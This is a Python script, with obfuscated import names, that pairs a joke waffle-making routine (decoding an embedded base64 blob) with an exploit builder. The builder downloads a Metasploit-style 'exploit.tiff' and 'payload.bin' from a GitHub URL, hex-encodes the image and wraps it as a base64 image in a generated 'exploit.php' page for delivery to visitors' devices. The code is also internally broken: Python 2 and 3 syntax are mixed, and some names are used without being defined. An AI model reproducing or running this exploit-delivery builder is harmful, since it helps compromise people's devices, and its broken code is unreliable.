import base64 as i
import binascii as l
import logging as f
import os as j
import pathlib as q
import pickle as m
import random as n
import requests as g
import sentry_sdk as e
import struct as a
import sys as s
import time as r
import wlib3 as o
import zlib as p
from sentry_sdk.integrations.logging import LoggingIntegration
g.packages.wlib3.disable_warnings()  # This is so we don't get some warning about SSL.
production = False
p_errors = False
def setup_log(sentry_w, print_errors):
    global logger, production
    sentry_logging = LoggingIntegration(
        level=f.INFO,
        event_level=f.INFO
    )
    e.init(dsn=sentry_w, integrations=[sentry_logging])
    logger = logging.getLogger(__name__)
    p_errors = print_errors
    production = True
def log(msg, level):  
    # TODO: Use number levels, strings are annoying
    if p_errors:
        print(msg)
    if production:
        if level == "VERBOSE":
            logger.debug(msg)
        elif level == "INFO":
            logger.info(msg)
        elif level == "WARNING":
            logger.warning(msg)
        elif level == "CRITICAL":
            logger.critical(msg)
def u8(b):
    if not 0 <= b <= 255:
        log("u8 out of range: %s" % b, "INFO")
        b = 0
    return a.pack(">B", b)
def u16(b):
    if not 0 <= b <= 65535:
        log("u16 out of range: %s" % b, "INFO")
        b = 0
    return a.pack(">H", b)
def u32(b):
    if not 0 <= b <= 4294967295:
        log("u32 out of range: %s" % b, "INFO")
        b = 0
    return a.pack(">I", b)
def pad(c):
    d = ""
    for _ in range(c): d += "\0"
    return d
class WaffleBatter:
	def __init__(self):
		self.cooking_time = 100
		self.batter = "eNp9VbGu3DgM7PMVhBs2sq4VDnHKwxUu1DLehQhBxeukD7iPvyEl78tLXuJisbbJ4Qw5lIn+dJUfri+/i+n92Lbr70siblreWFLejtE/zQhHZpW4C+OGW0pKoWuOUvVb6VlG/DUtJAsO8tC3SGFkpvKUy19xyO0ynlHl54LhYEIpteTnyOmiIcwa9BHLGIzHWvFSN0D+lFwaFzyM2ks4NjaKdb04NujEPWe8NTV4SPohvSWvSe3IUsn4kkQ5V3DRt+JtQyNq7GiEUpT+nt84SnSZqBOtq+SqpZsAoq1K97fPEbWWCcUSXwjJyBvNoR7+rN3lht1nRNDEF2r7DIRTR3+RsT/PBRFsini0VHsPEL9bUSXAOTeBqO59RrDWv1yz1IkRKHXtVhVqJt0ydoz5VV9i9oxHTIYXEGz9tri8QKSZV8gfmcLggEqcJoO2nXcGXyR9ekL4uymiuyM50QNsDnYOdU0SrMHhnBy2iQgcmEPOd1GReXG5xB/JuQ9vG8LmiNpe50SDVZA+Z6/fIOsfG5K4jeRGuWwO8SbRsC3nPkkILVkHyySxLHzu8335niZKdeOidXST6IvDXI+bBHo/IdH6OjtpJNN/q720zAVjypwuZTcqhMK3j5ni7QWLr+zCzU4Mh9E9JarAcYc1GLKvPQHkGZ2crdlj/rUdfsyazZcTOXQtGI0ko3icBvh+/i19sUBOzbYxE/PUat1BEEV9a9xu+yN6Ns/W/sgJ22pGz07NpZUR7wjQ0OprQsoNp8lricDGqfpUL7o5KHc7SYrJNa9Emizkkr62l95ByOas/16rh+8zIHqpIiCCzuDbVrFl+oHIlGTxy97LJjgL8vJRGPOIKjciEEDkw3E4+649OhcIOpdRw8TzJt0qnOFHDi8IMMFpqTDUrFeC7ebJd+2Y5tQB+OsHQPrkyPaB6OksLkWEzb6lhIH5ONLIn309dBt31whH+WbXvtsv803g07orZaNeyudfMRx2v81bk9d9H/vr6mNX5i//A5YHk94="
class Waffle:
	def __init__(self, waffle):
		self.waffle = waffle
	def display(self, file=s.stdout):
		file.write(self.waffle)
class WaffleIron:
	def __init__(self):
		self.power = False
		self.time = 0
		self.full = False
		self.contents = False
		pass
	def switchPower(self, power):
		self.power = power
	def fill(self, contents):
		if not self.power:
			raise RuntimeError("Turn on the iron first!")
		if not isinstance(contents, WaffleBatter):
			raise ValueError("Iron can only be filled with batter!")
		self.contents = contents
		self.time = r.time()
		return self.contents.cooking_time
	def contentsAreCooked(self):
		return r.time() > (self.time+self.contents.cooking_time)
	def getTimeLeft(self):
		return max(0,(self.time+self.contents.cooking_time) - r.time())
	def getContents(self):
		if self.contentsAreCooked():
			batter = self.contents.batter
			cookedbatter = p.decompress(i.b64decode(batter))
			self.contents = Waffle(cookedbatter)
		else:
			raise RuntimeError("Waffle is not yet cooked!")
		return self.contents
class BreakfastType:
	def __init__(self):
		raise NotImplementedError("BreakfastType is abstract")
class Waffles(BreakfastType):
	def __init__(self):
		pass
	def make(self):
		batter = WaffleBatter()
		iron = WaffleIron()
		iron.switchPower(True)
		cooktime = iron.fill(batter)
		cm, cs = divmod(cooktime,60)
		if cm > 0:
			print "Cooking time will be approximately %d minute%s and %d second%s"%(cm, 's'*(cm!=1), cs, 's'*(cs!=1))
		else:
			print "Cooking time will be approximately %d second%s"%(cs, 's'*(cs!=1))
		while not iron.contentsAreCooked():
			left = iron.getTimeLeft()
			m,s = divmod(left+0.99,60)
			s.stdout.write("%02d:%02d"%(m,s))
			s.stdout.flush()
			r.sleep(0.5)
			s.stdout.write("\x08"*5)
			s.stdout.flush()
		print
		waffle = iron.getContents()
		iron.switchPower(False)
		return waffle
class BreakfastMaker:
	preferredBreakfasts = {'bushing':Waffles}
	def __init__(self):
		pass
	def makeBreakfastFor(self, user):
		if not user in self.preferredBreakfasts:
			raise ValueError("I don't know how to make breakfast for %s!"%user)
		maker = self.preferredBreakfasts[user]
		breakfast = maker().make()
		return breakfast
def startbreakfast():
  print "Breakfast Maker v0.2"
  user = raw_input("Please enter your username: ")
  maker = BreakfastMaker()
  print "Making breakfast for %s..."%user
  breakfast = maker.makeBreakfastFor(user)
  print
  print "Your breakfast is ready!"
  print
  breakfast.display()
  print "\a"
def check(num):
  num2 = int(num)
  if (num2 % 2) == 0:
    print("{0} is Even".format(num2))
    v = "even"
    return v
  else:
    print("{0} is Odd".format(num2))
    v = "odd"
    return v
def t(k, x):
  if k == 0:
    if x == 1: #No Pre-Existing Mode
      pre(0)
      u(2)
    elif x == 2: #With Pre-Existing Mode
      pre(1)
      u(2)
    elif x == 3: #Download Hex Template Mode
      pre(1)
      j._exit(0)
    elif x == 4: #Re-generate ac File mode
      ac(0)
  elif k == 1:
    with open('exploit.tiff', 'rb') as f:
        hexv = l.hexlify(f.read())
        m.dump((hexv.decode('utf-8')), open('hex.dat', 'wb'))
  elif k == 2:
    v2 = str(q.Path(__file__).parent.absolute()) + "/" + "exploit.tiff"
    w2 = "https://raw.githubusercontent.com/planetbeing/touchfree/master/tiff/metasploit/exploit.tiff"
    downloadu(v2, w2)
  elif k == 3:
    v1 = str(q.Path(__file__).parent.absolute()) + "/" + "payload.bin"
    w1 = "https://raw.githubusercontent.com/planetbeing/touchfree/master/tiff/metasploit/payload.bin"
    downloadu(v1, w1)
  elif k == 4:
    ac(1)
  elif k == 5:
    if j.path.exists("payload.bin"):
      j.remove("payload.bin")
  elif k == 6:
    if j.path.exists("hex.dat"):
      j.remove("hex.dat")
  elif k == 7:
    if j.path.exists("exploit.tiff"):
      j.remove("exploit.tiff")
  elif k == 8:
    if j.path.exists("exploit.bin"):
      j.remove("exploit.bin")
  elif k == 9:
    if j.path.exists("exploit.php"):
      j.remove("exploit.php")
  else:
    t(0)
def run():
  load_file = open('hex.dat', 'rb')
  f = m.load(load_file)
  with open('exploit.bin', 'wb') as fout:
    fout.write(
      l.unhexlify(f)
    )
  t(6, 0)
  v = open('exploit.bin', 'rb').read()
  y = i.b64encode(v)
  z = y.decode()
  html = '<?php\n$htmlcode = "<img src=\\"v:image/png;base64,' + z + '\\">";\necho $htmlcode\n?>'
  open('exploit.php', 'w').write(html)
  t(7, 0)
  t(8, 0)
  return html
def pre(abk):
  if abk == 0:
    u(1)
    u(0)
    v = int(0)
    return v
  elif abk == 1:
    u(1)
    v = int(0)
    return v
  elif abk == 2:
    t(5, 0)
    u(0)
    v = "MSG:" + " " + str(q.Path(__file__).parent.absolute()) + " " + "DOWNLOADED!"
    return v
def ac(othrk):
    aa = "ac:\n"
    bb = aa + "base64 implmentation by fmw42\n"
    cc = bb + "hex implementation by falsetru\n"
    dd = cc + "file to hex implementation by ShadowRanger\n"
    ee = dd + "o downloading implementation by shazrow\n"
    ff = ee + "exploit.bin based on exploit.tiff by planetbeing\n"
    if othrk == 0:
      h = open("ac.txt", "a")
      h.write(f)
      h.close()
    elif othrk == 1:
      print(f)
def u(misck):
  if misck == 0:
    t(2, 0)
    t(1, 0)
  elif misck == 1:
    t(5, 0)
    t(4, 0)
    t(3, 0)
  elif misck == 2:
    run()
    j._exit(0)
def downloadu(v, w):
  http = o.PoolManager()
  r = http.request('GET', w, preload_content=False)
  chunk_size = n.randint(10, 1000)
  with open(v, 'wb') as out:
    while True:
      v = r.read(chunk_size)
      if not v:
        break
      out.write(v)
  r.release_conn()